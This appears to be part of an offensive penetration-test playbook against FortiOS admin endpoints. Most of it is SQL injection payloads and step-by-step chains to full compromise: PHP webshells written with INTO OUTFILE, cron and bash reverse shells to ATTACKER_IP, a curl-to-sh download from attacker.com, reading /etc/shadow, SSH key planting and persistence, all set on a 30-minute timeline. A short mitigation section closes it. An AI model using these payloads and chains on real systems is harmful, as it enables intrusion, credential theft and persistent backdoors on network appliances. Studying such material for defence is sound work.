1.1 SQL INJECTION ATTACK SURFACE IDENTIFICATION

Potential Vulnerable Endpoints in FortiOS:

  Database-Backed Functions:
    - /admin/user.cgi - User account management
    - /admin/group.cgi - Group administration
    - /admin/log.cgi - Logging interface (previously found format string)
    - /admin/address.cgi - Address/network management
    - /admin/service.cgi - Service definitions
    - /admin/firewall.cgi - Firewall rule management
    - /admin/policy.cgi - Security policy engine
    - /admin/vpn.cgi - VPN configuration
    - /admin/system.cgi - System settings
    - /api/v1/* - REST API endpoints (often vulnerable to injection)

  High-Probability Injection Points:
    - GET parameters: file, name, id, path, query, search, filter
    - POST parameters: username, password, hostname, config, data
    - HTTP Headers: User-Agent, X-Forwarded-For, Referer
    - Cookies: session_token, admin_token, preferences

1.2 SQL INJECTION PAYLOAD GENERATION

Basic SQL Injection Payloads:

  Simple Detection:
    ' OR '1'='1
    " OR "1"="1
    '; DROP TABLE users--
    1' UNION SELECT NULL--
    admin' --

  Time-Based Detection (Blind SQL Injection):
    ' AND SLEEP(5)--
    1' AND BENCHMARK(5000000,SHA1('test'))--
    '; WAITFOR DELAY '00:00:05'--

  Union-Based Injection:
    ' UNION SELECT NULL,NULL,NULL--
    ' UNION SELECT username,password,email FROM users--
    ' UNION SELECT version(),user(),database()--

  Boolean-Based Blind Injection:
    ' AND '1'='1
    ' AND '1'='2
    ' AND SUBSTRING(version(),1,1)>'4'

  Error-Based Injection:
    ' AND extractvalue(1,concat(0x7e,(select database())))--
    ' AND updatexml(1,concat(0x7e,(select user())),1)--

Advanced SQL Injection Payloads:

  Database Enumeration:
    ' UNION SELECT table_name FROM information_schema.tables--
    ' UNION SELECT column_name FROM information_schema.columns--
    ' UNION SELECT username,password_hash FROM admin_users--

  File Access (MySQL):
    ' UNION SELECT LOAD_FILE('/etc/passwd')--
    ' UNION SELECT LOAD_FILE('/opt/fortinet/config')--
    ' INTO OUTFILE '/var/www/html/shell.php' SELECT '<?php system($_GET["cmd"]); ?>'--

  User Enumeration:
    ' OR username LIKE 'admin%'--
    ' OR username IN (SELECT username FROM users)--
    ' AND EXISTS(SELECT * FROM users WHERE admin=1)--

Second-Order SQL Injection:

  Inject into database, trigger on output:
    username: admin' UNION SELECT password FROM users WHERE '1'='1
    (Username stored, password extracted when displayed)

  Stored XSS to SQLi chain:
    comment: <script>fetch('/admin/user.cgi?id=1'+SQL_PAYLOAD)</script>

1.4 SQL INJECTION EXPLOITATION CHAIN

Phase 1: Detection (5-10 minutes)
  Step 1: Identify SQL injection point
    - Send time-based payload: ' AND SLEEP(5)--
    - Measure response time
    - If delay observed = SQL injection confirmed

  Step 2: Determine database type
    - MySQL: ' AND SLEEP(5)-- (supported)
    - PostgreSQL: ' AND pg_sleep(5)-- (supported)
    - SQLite: ' AND sqlite_sleep(5000)-- (unsupported)
    - Test each to identify database

  Step 3: Map database structure
    - Query information_schema.tables
    - Identify user/admin tables
    - Locate password columns

Phase 2: Credential Extraction (5-15 minutes)
  Step 1: Extract admin credentials
    Payload: ' UNION SELECT username,password_hash FROM admin_users--
    Expected: admin:$6$...hash...

  Step 2: Extract API tokens
    Payload: ' UNION SELECT token,secret FROM api_tokens--
    Expected: token values for API authentication

  Step 3: Extract configuration secrets
    Payload: ' UNION SELECT config_key,config_value FROM settings--
    Expected: database passwords, encryption keys, secrets

Phase 3: Code Execution via SQL (15-30 minutes)

  MySQL File Write Execution:
    Step 1: Write PHP webshell
      Payload: ' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

    Step 2: Access webshell
      GET /shell.php?cmd=id
      GET /shell.php?cmd=cat+/etc/passwd
      GET /shell.php?cmd=whoami

  MySQL User-Defined Function (UDF) Execution:
    Step 1: Create malicious UDF
      CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.so'

    Step 2: Execute system commands
      SELECT sys_exec('id')
      SELECT sys_exec('cat /opt/fortinet/config')

  PostgreSQL Code Execution:
    Step 1: Enable PL/Python
      CREATE FUNCTION exploit(text) RETURNS text AS $$
        import os
        return os.popen($1).read()
      $$ LANGUAGE plpython3u

    Step 2: Execute commands
      SELECT exploit('id')
      SELECT exploit('cat /etc/passwd')

1.5 BLIND SQL INJECTION EXPLOITATION (No error messages)

Time-Based Boolean Blind SQL Injection:

  Extract admin password hash character by character:

    For position=1, char_code=1 to 127:
      Payload: ' AND IF(ASCII(SUBSTRING((SELECT password FROM admin WHERE username='admin'),1,1))>64,SLEEP(5),0)--

      If response delayed (>5 sec): character code > 64
      If response normal: character code < 64

      Binary search to find exact character
      Repeat for each position

  Full extraction example:
    ' AND IF(SUBSTRING((SELECT password FROM admin LIMIT 1),1,1)='a',SLEEP(5),0)--
    ' AND IF(SUBSTRING((SELECT password FROM admin LIMIT 1),1,1)='d',SLEEP(5),0)--
    ' AND IF(SUBSTRING((SELECT password FROM admin LIMIT 1),1,1)='m',SLEEP(5),0)--
    ... (continue until char found)

Error-Based Blind SQL Injection:

  Extract data via error messages:
    ' AND extractvalue(1,concat(0x7e,(SELECT username FROM admin LIMIT 1)))--

    Error: XPATH syntax error: '~admin'
    (Database reveals admin username in error)

2.1 SQL INJECTION TO RCE CONVERSION CHAINS

Chain 1: SQL Injection → PHP Webshell → System Commands

  Step 1: Identify web root (typically /var/www/html or /usr/local/share/fortinet/www)
    - Test common paths
    - Check HTTP response headers
    - Analyze directory structure via error messages

  Step 2: Craft webshell payload
    PHP Webshell:
      <?php system($_GET['cmd']); ?>

    Bypassing potential filters:
      <?php @eval($_POST['code']); ?>
      <?php system(base64_decode($_GET['payload'])); ?>
      <?php $c=$_GET['c']; system($c); ?>

  Step 3: Write webshell via SQL
    MySQL:
      ' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

    PostgreSQL (with file permissions):
      COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'--

  Step 4: Execute commands via webshell
    GET /shell.php?cmd=id
    GET /shell.php?cmd=whoami
    GET /shell.php?cmd=cat%20/etc/passwd
    GET /shell.php?cmd=ls%20-la%20/opt/fortinet/
    GET /shell.php?cmd=curl%20http://attacker.com/backdoor.sh|sh

Chain 2: SQL Injection → Cron Job Backdoor

  Step 1: Extract crontab location
    SELECT * FROM information_schema.tables WHERE table_schema='mysql'

  Step 2: Create malicious cron entry
    Payload: ' UNION SELECT '* * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' INTO OUTFILE '/var/spool/cron/crontabs/root'--

    Result: Reverse shell executes every minute

  Step 3: Verify persistence
    - Shell connects to attacker at ATTACKER_IP:4444
    - Executes with cron privileges
    - Persists across service restarts

Chain 3: SQL Injection → SSH Key Installation

  Step 1: Generate attacker SSH key
    ssh-keygen -t rsa -N "" -f /tmp/attacker_key

  Step 2: Create authorized_keys via SQL
    Payload: ' UNION SELECT LOAD_FILE('/tmp/attacker_key.pub') INTO OUTFILE '/root/.ssh/authorized_keys'--

    OR:
    ' UNION SELECT 'ssh-rsa AAAA...(public key)' INTO OUTFILE '/root/.ssh/authorized_keys'--

  Step 3: SSH access with private key
    ssh -i /tmp/attacker_key root@192.168.1.50

    Result: Persistent root shell via SSH

Chain 4: SQL Injection → Direct System Command Execution (if available)

  PostgreSQL with os.popen:
    CREATE OR REPLACE FUNCTION exploit(text) RETURNS text AS $$
      import os; return os.popen($1).read()
    $$ LANGUAGE plpython3u;

    SELECT exploit('id');
    SELECT exploit('cat /etc/shadow');

  MySQL with UDF (if available):
    CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.so';
    SELECT sys_exec('chmod 777 /opt/fortinet/config');

2.2 COMBINING SQL INJECTION WITH EXISTING VULNERABILITIES

SQLi + Buffer Overflow Chain:

  Step 1: Extract credentials via SQL injection
    ' UNION SELECT username,password FROM admin_users--
    Result: admin:password123

  Step 2: Use credentials for authentication
    Login with extracted credentials

  Step 3: Trigger buffer overflow in authenticated endpoint
    POST /admin/hostname.cgi
    hostname=[512 A's - buffer overflow payload]

  Step 4: Escalate to RCE
    - Overflow causes crash
    - ROP gadgets execute malicious code
    - Full system compromise

SQLi + Path Traversal Chain:

  Step 1: SQL injection to extract SSH keys
    ' UNION SELECT LOAD_FILE('/home/admin/.ssh/id_rsa')--
    Result: -----BEGIN OPENSSH PRIVATE KEY-----

  Step 2: Path traversal to verify key location
    GET /admin/path.cgi?file=../../home/admin/.ssh/id_rsa

  Step 3: Use SSH key for remote access
    ssh -i extracted_key admin@192.168.1.50

SQLi + Authentication Bypass Chain:

  Step 1: SQL injection to extract session tokens
    ' UNION SELECT session_token FROM sessions WHERE username='admin'--

  Step 2: Use extracted token for admin access
    GET /admin/config/system
    Cookie: session_token=[extracted_token]

  Step 3: Modify configuration to enable SSH root login
    POST /admin/system.cgi
    Parameter: ssh_root_login=enable

2.3 SQL INJECTION DETECTION IN RESPONSES

Indicators of SQL Injection Success:

  Error-Based Indicators:
    - "SQL syntax error near..."
    - "MySQL error: ..."
    - "PostgreSQL: ERROR"
    - Database error messages with query structure
    - Stack traces revealing database backend

  Response Size Indicators:
    - Normal response: 1,024 bytes
    - SQLi response: 50,000+ bytes (extracted data)
    - UNION SELECT returns significantly more data

  Timing Indicators:
    - Normal response: <100ms
    - Time-based SQLi: >5000ms (sleep injection)
    - Consistent delay correlation with payload

  Response Content Indicators:
    - Usernames appearing in response (admin, root, etc.)
    - Password hashes visible
    - Database structure in error messages
    - Unexpected data fields (password columns, etc.)

4.1 COMPLETE RCE CHAIN: SQL INJECTION → WEBSHELL → PRIVILEGE ESCALATION

Timeline: ~30 minutes to complete system compromise

Step 1: SQL Injection Detection (5 minutes)
  - Send: GET /admin/user.cgi?id=1' AND SLEEP(5)--
  - Observe: 5+ second delay = vulnerable
  - Confirm: SQL injection in "id" parameter

Step 2: Database Enumeration (5 minutes)
  - Query: UNION SELECT table_name FROM information_schema.tables
  - Result: admin_users, config_settings, logs, sessions
  - Identify: admin_users table contains passwords

Step 3: Credential Extraction (3 minutes)
  - Payload: UNION SELECT username,password_hash FROM admin_users
  - Result: admin:$6$rounds=656000$abc123...
  - Extract: Multiple admin accounts found

Step 4: Web Root Discovery (2 minutes)
  - Try: UNION SELECT @@datadir
  - Result: /var/lib/mysql/ (database path)
  - Try: INTO OUTFILE paths
  - Identify: /var/www/html as likely web root

Step 5: Webshell Deployment (3 minutes)
  - Payload: UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/admin.php'
  - Result: File written (or error if permissions denied)
  - Alternative: Try /usr/local/share/fortinet/www/

Step 6: Webshell Access (1 minute)
  - GET /admin.php?cmd=id
  - GET /admin.php?cmd=whoami
  - GET /admin.php?cmd=pwd
  - Result: Command output appears in response

Step 7: Reverse Shell Establishment (3 minutes)
  - Command: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
  - Execute: GET /admin.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261
  - Result: Reverse shell connects to attacker listener

Step 8: Privilege Escalation (2 minutes)
  - Check: sudo -l (check sudo access)
  - Check: find / -perm -4000 (SUID binaries)
  - Exploit: Known SUID/sudo vulnerabilities
  - Result: root access obtained

Step 9: Persistence Installation (3 minutes)
  - SSH key: Upload attacker's SSH key to /root/.ssh/authorized_keys
  - Cron: Add cron job for reverse shell re-establishment
  - Service: Create systemd service for persistence
  - Result: Multiple persistence mechanisms installed

Total Time: ~30 minutes from initial SQL injection to full system compromise

PHASE 9: MITIGATION & DEFENSE RECOMMENDATIONS
================================================================================

9.1 SQL INJECTION PREVENTION

Code-Level Mitigations:

  1. Prepared Statements (Parameterized Queries)
     VULNERABLE:
       query = "SELECT * FROM users WHERE id=" + user_input

     SAFE:
       query = "SELECT * FROM users WHERE id = ?"
       connection.execute(query, [user_input])

  2. Input Validation
     - Whitelist allowed characters
     - Validate data types (integer parameters should only accept integers)
     - Reject unexpected characters or length

  3. Least Privilege Database Accounts
     - Application database account: SELECT, INSERT, UPDATE only
     - No DROP, CREATE, ALTER, LOAD_FILE, INTO OUTFILE permissions
     - Separate read-only account for queries

  4. Error Handling
     - Catch exceptions without revealing database structure
     - Log errors for security audit, don't display to users
     - Generic error messages ("Database error occurred")

  5. Web Application Firewall (WAF)
     - Block common SQLi patterns (UNION, SLEEP, LOAD_FILE)
     - Rate limit suspicious queries
     - Alert on multiple SQLi attempts

9.2 COMMAND INJECTION PREVENTION

Code-Level Mitigations:

  1. Avoid Shell Commands
     VULNERABLE:
       os.system("hostname " + user_input)

     SAFE:
       import socket; socket.gethostname()  (no shell involved)

  2. Use Safe APIs
     - subprocess.run(..., shell=False) instead of os.system()
     - Direct API calls instead of command-line tools
     - Library functions instead of system commands

  3. Input Validation
     - Whitelist allowed characters
     - Reject shell metacharacters: `;`, `|`, `&`, `$`, `` ` ``
     - Validate hostname format (alphanumeric + hyphen only)

  4. Sandboxing
     - Run services with minimal privileges
     - Use containers to isolate application
     - Restrict file system access with chroot/jails

9.3 SECURITY HARDENING RECOMMENDATIONS

FortiOS Deployment Hardening:

  1. Update Immediately
     - Apply all available FortiOS patches
     - Monitor Fortinet security advisories
     - Test patches in staging environment first

  2. Access Control
     - Restrict admin interface to specific management IPs
     - Use VPN/bastion host for remote management
     - Implement role-based access control (RBAC)
     - Disable SSH password authentication (use keys only)

  3. Monitoring & Logging
     - Enable comprehensive audit logging
     - Monitor for SQLi patterns in logs
     - Alert on suspicious database queries
     - Regular log review and analysis

  4. Network Segmentation
     - Isolate FortiOS management network
     - Restrict database access to admin only
     - Implement network IDS/IPS rules for SQLi detection

  5. Incident Response
     - Prepare incident response plan
     - Practice response procedures
     - Document forensic analysis procedures
     - Establish communication channels for security incidents
